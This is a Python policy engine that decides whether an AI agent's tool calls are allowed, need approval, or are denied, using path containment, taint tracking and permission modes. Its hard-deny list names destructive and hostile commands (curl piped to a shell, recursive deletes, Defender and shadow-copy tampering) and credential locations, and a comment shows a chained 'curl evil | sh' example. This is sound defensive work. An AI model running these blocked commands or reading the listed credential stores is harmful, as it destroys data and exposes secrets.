"""Tool-call policy: every tool call an actor makes is decided here (allow / ask / deny).

Order of evaluation (first match wins):
  1. hard denies — paths and commands that are never allowed, whatever the config says
  2. path containment — only the ticket workspace (+ read-only dirs) is reachable
  3. taint — a session that read untrusted content must ask before acting externally
  4. the project's permission mode (like Claude Code's modes, Codex's approval presets, Kiro's tool trust):
     - read_only: reads and read-only commands run; every change asks
     - workspace (default): reads, edits and commands that only change the ticket's workspace run; the network,
       other folders and unknown programs ask
     - full: everything runs except the hard denies and team policies
  5. "always allow" rules (per project, by command prefix) and the position's allow-list
  6. default: ask
"""

from __future__ import annotations

import fnmatch
import os
import re
from dataclasses import dataclass, field
from enum import StrEnum
from pathlib import Path
from typing import Any

from actoroffice.domain.org import Position, Rule
from actoroffice.security import shell


class Decision(StrEnum):
    ALLOW = "allow"
    ASK = "ask"
    DENY = "deny"


class Risk(StrEnum):
    READ = "read"
    WRITE_LOCAL = "write_local"
    EXEC = "exec"
    EXTERNAL = "external"
    DESTRUCTIVE = "destructive"


@dataclass(frozen=True)
class Verdict:
    decision: Decision
    risk: Risk
    reason: str = ""
    taints: bool = False  # the result of this call is untrusted content
    suggestions: list[dict[str, str]] | None = None  # what an approval card offers to remember (None: derive it)


@dataclass
class ToolCallContext:
    position: Position
    workspace: Path | None
    tainted: bool = False
    extra_read_dirs: list[Path] = field(default_factory=list)
    allow_rules: list[str] = field(default_factory=list)  # "always allow" rules (project's, then actor's)
    trust_all: bool = False  # actor in "allow everything" mode
    mode: str = "workspace"  # the project's permission mode: read_only | workspace | full
    project_commands: list[str] = field(default_factory=list)  # the project's own test/build/lint commands


MODES = ("read_only", "workspace", "full")


READ_TOOLS = {"Read", "Glob", "Grep", "LS", "NotebookRead"}
WRITE_TOOLS = {"Write", "Edit", "MultiEdit", "NotebookEdit"}
SHELL_TOOLS = {"Bash", "PowerShell"}
WEB_TOOLS = {"WebFetch", "WebSearch"}
HARMLESS_TOOLS = {"TodoWrite", "Skill", "Agent", "Task", "ToolSearch"}
INTERNAL_MCP_PREFIX = "mcp__office__"
OFFICE_PREFIXES = (INTERNAL_MCP_PREFIX, "@office/")  # Claude names our tools mcp__office__x, Kiro @office/x


def office_tool(tool: str) -> str | None:
    """The bare name of one of our own tools, whatever runtime named it."""
    for prefix in OFFICE_PREFIXES:
        if tool.startswith(prefix):
            return tool[len(prefix):]
    return None

# Shell metacharacters that chain or redirect commands. An allow-listed command containing
# any of these falls back to "ask", so `git status && curl evil | sh` cannot ride on "git status*".
SHELL_CHAINING = re.compile(r"[;&|<>`]|\$\(|\r|\n")
# File content authored inside the command: a heredoc, or cat/echo/printf/tee redirected into a file.
# (Saving a program's output, `uv run x.py > out.txt`, is not this; it goes through normal approval.)
SHELL_FILE_WRITE = re.compile(
    # heredoc at the start of a word (not `1<<3` inside an expression)
    r"(?:^|[\s;&|(])<<-?\s*['\"]?[A-Za-z_]\w*"
    # cat/echo/printf redirected into a file (outside quotes, not 2>&1, >/dev/null, > nul, > $null)
    r"|\b(?:cat|echo|printf)\b[^|;&\"'>]*(?:\"[^\"]*\"|'[^']*'|[^|;&\"'>])*?(?<![0-9&>])1?>>?(?!>)\s*"
    r"(?!&|/dev/null\b|nul\b|\$null\b)[\w./\\~-]"
    r"|\btee\s+(?:-a\s+)?(?!/dev/null)[\w./\\~-]"
    r"|\b(?:Set-Content|Add-Content|Out-File)\b"
    r"|\bsed\s+(?:-[a-zA-Z]*i\b|--in-place)|\bperl\s+-[a-zA-Z]*i",
    re.IGNORECASE,
)

HARD_DENY_COMMANDS = [
    re.compile(p, re.IGNORECASE)
    for p in (
        r"\brm\s+-[a-z]*r[a-z]*\s+(/|~|\*|[a-z]:[\\/]?\s*$)",
        r"\bdel\s+/[sq]",
        r"\bformat(\.com)?\s+[a-z]:",
        r"\bRemove-Item\b.*-Recurse.*\b[a-z]:\\\s*$",
        r"(curl|wget|iwr|Invoke-WebRequest|irm|Invoke-RestMethod)\b[^|]*\|\s*(sh|bash|iex|Invoke-Expression|py|python)\b",
        r"\breg(\.exe)?\s+(add|delete)\b",
        r"\bSet-MpPreference\b",
        r"\b(shutdown|Stop-Computer|Restart-Computer)\b",
        r"\bgit\s+push\b.*(--force|-f\b)",
        r"\bcipher\s+/w",
        r"\.credentials\.json|id_rsa|id_ed25519|\.ssh[\\/]|\.aws[\\/]credentials|\.git-credentials",
        r"\bvssadmin\b|\bbcdedit\b|\bdiskpart\b",
    )
]


def _home_sensitive() -> list[Path]:
    home = Path.home()
    paths = [home / ".ssh", home / ".claude", home / ".aws", home / ".config" / "gh", home / ".git-credentials", home / ".kiro"]
    appdata = os.environ.get("APPDATA")
    localappdata = os.environ.get("LOCALAPPDATA")
    if appdata:
        paths += [Path(appdata) / "Microsoft" / "Credentials", Path(appdata) / "Microsoft" / "Protect"]
    if localappdata:
        paths += [Path(localappdata) / "Google" / "Chrome" / "User Data", Path(localappdata) / "Microsoft" / "Edge" / "User Data"]
    return paths


class PolicyEngine:
    def __init__(self, *, protected_dirs: list[Path] | None = None) -> None:
        # protected_dirs: our own data dir (db, config, secrets) — never reachable by actors.
        self.protected = [p.resolve() for p in [*_home_sensitive(), *(protected_dirs or [])]]

    def decide(self, tool: str, args: dict[str, Any], ctx: ToolCallContext, *, external: bool = False) -> Verdict:
        """external: one of our own tools that acts outside the machine (Jira comment, pull request…)."""
        verdict = self._ticket_external(tool, ctx) if external else self._decide(tool, args, ctx)
        if verdict.decision != Decision.ASK:
            return verdict  # hard denies, protected paths and position denies are never overridden
        target = target_of(tool, args)
        for rule in ctx.allow_rules:
            if tool in SHELL_TOOLS and SHELL_CHAINING.search(target):
                break  # a chain is matched command by command (_chain): `git status*` must not cover `git status && curl …`
            if rule_matches(rule, tool, target):
                return Verdict(Decision.ALLOW, verdict.risk, f"allowed by rule {rule}", verdict.taints)
        if ctx.trust_all or ctx.mode == "full":
            return Verdict(Decision.ALLOW, verdict.risk, "allowed: full trust", verdict.taints)
        return verdict

    def _decide(self, tool: str, args: dict[str, Any], ctx: ToolCallContext) -> Verdict:
        if tool in HARMLESS_TOOLS:
            return Verdict(Decision.ALLOW, Risk.READ)
        if office_tool(tool) is not None:
            # Our own tools enforce their own rules (ticket ownership, ask_user, …).
            return Verdict(Decision.ALLOW, Risk.READ)
        if tool in READ_TOOLS:
            return self._file_access(tool, args, ctx, write=False)
        if tool in WRITE_TOOLS:
            return self._file_access(tool, args, ctx, write=True)
        if tool in SHELL_TOOLS:
            return self._shell(str(args.get("command", "")), ctx)
        if tool in WEB_TOOLS:
            rule = ctx.position.policy.web
            return Verdict(_decision(rule), Risk.READ, f"web access is '{rule}' for this position", taints=True)
        if tool.startswith("mcp__"):
            # Capability-pack connectors: anything that acts outside the machine.
            return self._external(tool, ctx)
        return Verdict(Decision.ASK, Risk.EXEC, f"unknown tool {tool}")

    # ---- files ----------------------------------------------------------------------------

    def _file_access(self, tool: str, args: dict[str, Any], ctx: ToolCallContext, *, write: bool) -> Verdict:
        risk = Risk.WRITE_LOCAL if write else Risk.READ
        raw = args.get("file_path") or args.get("notebook_path") or args.get("path")
        if not raw:
            # Glob/Grep without a path search the cwd, which is the workspace.
            return Verdict(Decision.ALLOW if ctx.workspace else Decision.ASK, risk)
        target = self._resolve(str(raw), ctx.workspace)
        if self._is_protected(target):
            return Verdict(Decision.DENY, risk, f"{raw} is a protected location")
        if ctx.workspace and _within(target, ctx.workspace):
            if write and ctx.mode == "read_only":
                return Verdict(Decision.ASK, risk, "the project is in read-only mode: changes need approval")
            return Verdict(Decision.ALLOW, risk)
        if not write and any(_within(target, d) for d in self._read_dirs(ctx)):
            return Verdict(Decision.ALLOW, risk)
        if write and any(_within(target, d) for d in self._read_dirs(ctx)):
            return Verdict(
                Decision.DENY, risk,
                f"{raw} is in a read-only folder. If the work must change the project's files, call "
                "project_access_request (the user decides with one click); do not write the files somewhere else instead.",
            )
        return Verdict(Decision.DENY, risk, f"{raw} is outside this ticket's workspace")

    def _read_dirs(self, ctx: ToolCallContext) -> list[Path]:
        dirs = [Path(d).resolve() for d in ctx.position.policy.read_only_dirs]
        return dirs + [d.resolve() for d in ctx.extra_read_dirs]

    def _is_protected(self, target: Path) -> bool:
        return any(_within(target, p) for p in self.protected)

    @staticmethod
    def _resolve(raw: str, workspace: Path | None) -> Path:
        p = Path(os.path.expandvars(os.path.expanduser(raw)))
        if not p.is_absolute() and workspace:
            p = workspace / p
        return p.resolve()

    # ---- shell ----------------------------------------------------------------------------

    def _shell(self, command: str, ctx: ToolCallContext) -> Verdict:
        cmd = command.strip()
        for pattern in HARD_DENY_COMMANDS:
            if pattern.search(cmd):
                return Verdict(Decision.DENY, Risk.DESTRUCTIVE, "command matches a hard safety rule")
        for prot in self.protected:
            if str(prot).lower() in cmd.lower():
                return Verdict(Decision.DENY, Risk.DESTRUCTIVE, "command touches a protected location")
        policy = ctx.position.policy
        if any(fnmatch.fnmatchcase(cmd, pat) for pat in policy.bash_deny):
            return Verdict(Decision.DENY, Risk.EXEC, "command is denied for this position")
        if SHELL_FILE_WRITE.search(cmd):
            # Writing files through the shell skips the workspace checks of Write/Edit and needs a human click
            # every time; steer the actor to the right tool instead of asking the user.
            return Verdict(
                Decision.DENY,
                Risk.WRITE_LOCAL,
                "Do not write files through the shell (heredoc or > redirection). Use the Write tool to create a file "
                "and Edit to change one, then run each command on its own (no && chains).",
            )
        if ctx.workspace is not None and not cmd.lower().startswith(("powershell", "pwsh")):
            judged = self._chain(cmd, ctx)
            if judged is not None:
                return judged
        chained = bool(SHELL_CHAINING.search(cmd))
        if not chained and any(fnmatch.fnmatchcase(cmd, pat) for pat in policy.bash_allow):
            return Verdict(Decision.ALLOW, Risk.EXEC)
        parts = chain_parts(cmd)
        if parts and all(any(fnmatch.fnmatchcase(part, pat) for pat in policy.bash_allow) for part in parts):
            # `git add -A && git commit -m x`, `pytest -q 2>&1 | tail -5`: every piece is allowed on its own.
            return Verdict(Decision.ALLOW, Risk.EXEC)
        reason = "chained/redirected shell command needs approval" if chained else "shell command needs approval"
        return Verdict(_decision(policy.exec_default, allow_means_ask=chained), Risk.EXEC, reason)

    def _chain(self, cmd: str, ctx: ToolCallContext) -> Verdict | None:
        """Judge each command of a chain on its own (None: the line could not be split)."""
        parts = shell.split(cmd)
        if parts is None:
            return None
        place = shell.Place(ctx.workspace, self._read_dirs(ctx), self.protected)
        limit = shell.Kind.READ if ctx.mode == "read_only" else shell.Kind.WORKSPACE
        allow_list = [] if ctx.mode == "read_only" else ctx.position.policy.bash_allow
        cwd: Path | None = None
        blocking: list[tuple[shell.Command, str]] = []
        worst = shell.Kind.READ
        for part in parts:
            hit = shell.touches_protected(part, place, cwd)
            if hit:
                return Verdict(Decision.DENY, Risk.DESTRUCTIVE, f"{hit} is a protected location")
        for part in parts:
            text = shell.unwrap(part).text or part.text
            if any(rule_matches(rule, "Bash", text) for rule in ctx.allow_rules):
                continue
            kind, why = shell.classify(part, place, cwd)
            if kind != shell.Kind.READ and limit == shell.Kind.WORKSPACE and (
                text in ctx.project_commands or any(fnmatch.fnmatchcase(text, pat) for pat in allow_list)
            ):
                # the project's own commands and the position's allow-list run, if their redirects stay inside
                redirects, _ = shell.classify(shell.Command(["true"], part.redirects), place, cwd)
                if redirects != shell.Kind.UNKNOWN:
                    continue
            if shell.program_name(part.argv[0]) == "cd" and kind == shell.Kind.READ:
                cwd = shell.resolve(part.argv[1] if len(part.argv) > 1 else "~", place, cwd) or cwd
            worst = shell.worst([worst, kind])
            if shell.ORDER[kind] > shell.ORDER[limit]:
                blocking.append((part, why))
        if not blocking:
            return Verdict(Decision.ALLOW, Risk.READ if worst == shell.Kind.READ else Risk.WRITE_LOCAL)
        part, why = blocking[0]
        risk = Risk.EXTERNAL if worst == shell.Kind.NETWORK else Risk.EXEC
        reason = f"`{part.text[:120]}`: {why or 'program not known to be safe'}"
        if ctx.mode == "read_only" and worst == shell.Kind.WORKSPACE:
            reason = f"`{part.text[:120]}` changes files (read-only mode)"
        return Verdict(Decision.ASK, risk, reason, suggestions=chain_suggestions(cmd, [p for p, _ in blocking]))

    # ---- external ------------------------------------------------------------------------

    def _ticket_external(self, tool: str, ctx: ToolCallContext) -> Verdict:
        """Our own tools that act outside the machine, on this ticket only (its pull request, its Jira issue).
        The plan a person approved covers them; read-only mode and a tainted session still ask."""
        if ctx.mode != "read_only" and not ctx.tainted:
            return Verdict(Decision.ALLOW, Risk.EXTERNAL, "acts on this ticket only")
        return self._external(tool, ctx)

    def _external(self, tool: str, ctx: ToolCallContext) -> Verdict:
        rule = ctx.position.policy.external
        if ctx.tainted and rule == "allow":
            return Verdict(Decision.ASK, Risk.EXTERNAL, "session read untrusted content; external actions need approval")
        return Verdict(_decision(rule), Risk.EXTERNAL, f"external tool {tool}")


CHAIN_SPLIT = re.compile(r"\s*(?:&&|\|\||;|\|)\s*")
UNSAFE_IN_CHAIN = re.compile(r"`|\$\(|\r|\n|<|(?<![0-9])>(?!&)|[0-9]>(?!&1)")


def chain_parts(cmd: str) -> list[str] | None:
    """The commands of a simple chain (&&, ||, ;, |), or None when it uses substitution or redirects into files.
    `2>&1` is fine. Quotes are not parsed: a chain character inside quotes just makes a part not match."""
    if UNSAFE_IN_CHAIN.search(cmd):
        return None
    parts = [re.sub(r"\s*2>&1\s*", " ", part).strip() for part in CHAIN_SPLIT.split(cmd)]
    return [part for part in parts if part] or None


RULE = re.compile(r"^(?P<tool>[\w*.\-]+)(?:\((?P<pattern>.*)\))?$", re.DOTALL)


def target_of(tool: str, args: dict[str, Any]) -> str:
    for key in ("command", "file_path", "notebook_path", "path", "url", "pattern", "query"):
        if key in args:
            return str(args[key])
    return ""


def rule_matches(rule: str, tool: str, target: str) -> bool:
    """Claude Code style: 'Bash' (any call), 'Bash(npm install *)' (glob on the command / path / URL)."""
    m = RULE.match(rule.strip())
    if not m or not fnmatch.fnmatchcase(tool, m.group("tool")):
        return False
    pattern = m.group("pattern")
    return pattern is None or fnmatch.fnmatchcase(target.strip(), pattern.strip())


def suggest_rules(tool: str, target: str) -> list[dict[str, str]]:
    """What an approval card offers to remember, from narrow to broad. A shell is never offered whole: "allow every
    command" is a mode (full trust), not a click on a card."""
    target = target.strip()
    options: list[dict[str, str]] = []
    if tool in SHELL_TOOLS:
        prefix = command_prefix(target.split()) if not SHELL_CHAINING.search(target) else None
        if prefix:
            options.append({"scope": "prefix", "rule": f"{tool}({prefix}*)"})
        if target and len(target) <= 300 and f"{tool}({target})" not in [o["rule"] for o in options]:
            options.append({"scope": "exact", "rule": f"{tool}({target})"})
        return options
    if target and len(target) <= 300 and target != tool:
        options.append({"scope": "exact", "rule": f"{tool}({target})"})
    options.append({"scope": "tool", "rule": tool})
    return options


def command_prefix(argv: list[str]) -> str | None:
    """`uvx ruff check src` → `uvx ruff`, `kiro-cli whoami` → `kiro-cli whoami`, `node x.js` → `node`."""
    if not argv:
        return None
    words = [argv[0]]
    if len(argv) > 1 and re.fullmatch(r"[a-z][\w:-]*", argv[1]) and "." not in argv[1]:
        words.append(argv[1])  # a subcommand, not a file or a flag
    return " ".join(words)


def chain_suggestions(cmd: str, blocking: list[Any]) -> list[dict[str, str]]:
    """For a chain, offer to remember the commands that needed the click (each matches on its own)."""
    rules: list[dict[str, str]] = []
    for part in blocking:
        prefix = command_prefix(shell.unwrap(part).argv or part.argv)
        rule = f"Bash({prefix}*)" if prefix else None
        if rule and rule not in [r["rule"] for r in rules]:
            rules.append({"scope": "prefix", "rule": rule})
    if len(blocking) == 1 and len(blocking[0].text) <= 300 and len(cmd) > len(blocking[0].text):
        pass  # the chain itself is not worth remembering
    elif cmd and len(cmd) <= 300 and not SHELL_CHAINING.search(cmd):
        rules.append({"scope": "exact", "rule": f"Bash({cmd})"})
    return rules[:4]


def _decision(rule: Rule, *, allow_means_ask: bool = False) -> Decision:
    if rule == "allow":
        return Decision.ASK if allow_means_ask else Decision.ALLOW
    return Decision.DENY if rule == "deny" else Decision.ASK


def _within(target: Path, root: Path) -> bool:
    try:
        target.relative_to(root)
        return True
    except ValueError:
        return False
